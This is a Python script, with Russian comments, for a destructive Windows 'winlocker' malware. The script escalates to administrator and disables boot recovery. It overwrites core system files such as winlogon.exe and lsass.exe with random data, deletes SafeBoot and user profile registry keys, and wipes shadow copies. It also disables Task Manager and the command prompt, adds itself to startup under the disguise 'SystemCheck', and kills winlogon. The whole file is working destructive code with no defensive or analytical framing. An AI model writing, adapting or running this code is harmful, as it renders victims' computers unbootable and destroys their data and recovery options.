# winlocker_silent.py — МОЛЧАЛИВАЯ НЕВОЗВРАТНАЯ БЛОКИРОВКА
import os
import sys
import ctypes
import shutil
import winreg
import subprocess
import time


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def request_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()


def block_boot():
    try:
        subprocess.run(['bcdedit', '/set', '{default}', 'recoveryenabled', 'No'], capture_output=True)
        subprocess.run(['bcdedit', '/set', '{default}', 'bootstatuspolicy', 'ignoreallfailures'], capture_output=True)
        subprocess.run(['bcdedit', '/set', '{default}', 'badmemoryaccess', 'Yes'], capture_output=True)
    except:
        pass


def corrupt_system_files():
    critical_files = [
        r"C:\Windows\System32\winlogon.exe",
        r"C:\Windows\System32\lsass.exe",
        r"C:\Windows\System32\services.exe",
        r"C:\Windows\System32\csrss.exe",
        r"C:\Windows\System32\smss.exe",
    ]
    for file in critical_files:
        try:
            if os.path.exists(file):
                with open(file, 'wb') as f:
                    f.write(os.urandom(1024 * 1024))
        except:
            pass


def corrupt_registry():
    try:
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot")
    except:
        pass
    try:
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList")
    except:
        pass
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "AutoAdminLogon", 0, winreg.REG_SZ, "0")
            winreg.SetValueEx(regkey, "DefaultUserName", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(regkey, "DefaultPassword", 0, winreg.REG_SZ, "")
    except:
        pass


def delete_system_restore():
    try:
        subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], capture_output=True)
    except:
        pass


def disable_task_manager():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(key, subkey) as regkey:
            winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except:
        pass


def disable_cmd():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Policies\Microsoft\Windows\System"
        with winreg.CreateKey(key, subkey) as regkey:
            winreg.SetValueEx(regkey, "DisableCMD", 0, winreg.REG_DWORD, 2)
    except:
        pass


def add_to_startup():
    """Добавление в автозагрузку для гарантированного срабатывания при перезагрузке"""
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "SystemCheck", 0, winreg.REG_SZ, sys.executable)
    except:
        pass


def main():
    # Запрос прав администратора
    request_admin()

    # Добавляем себя в автозагрузку
    add_to_startup()

    # Блокировка
    block_boot()
    corrupt_system_files()
    corrupt_registry()
    delete_system_restore()
    disable_task_manager()
    disable_cmd()

    # Принудительное завершение критических процессов
    try:
        subprocess.run(['taskkill', '/f', '/im', 'winlogon.exe'], capture_output=True)
    except:
        pass

    # Завершаемся без следов
    sys.exit()


if __name__ == "__main__":
    main()